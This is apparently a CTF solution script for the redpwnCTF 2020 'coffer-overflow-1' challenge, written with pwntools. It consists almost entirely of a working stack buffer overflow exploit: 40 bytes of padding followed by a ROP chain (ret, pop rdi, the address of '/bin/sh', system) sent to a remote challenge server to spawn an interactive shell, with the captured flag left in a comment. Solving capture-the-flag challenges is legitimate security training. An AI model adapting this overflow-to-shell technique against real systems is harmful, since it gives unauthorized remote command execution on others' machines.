from pwn import *

file = "./coffer-overflow-1"

context.binary = file
context.log_level = 'debug'

bin = ELF(file)
r = process(file)
#raw_input()
r = remote("2020.redpwnc.tf", 31255)
# flag{th1s_0ne_wasnt_pure_gu3ssing_1_h0pe}

payload = "A" * 40
payload += pack(0x000000000040053e) # ret
payload += pack(0x0000000000400773) # : pop rdi; ret;
payload += pack(0x00400813) # /bin/sh	/bin/sh	ds
payload += pack(bin.symbols["system"])


r.sendlineafter("What do you want to fill your coffer with?", payload)
r.interactive()


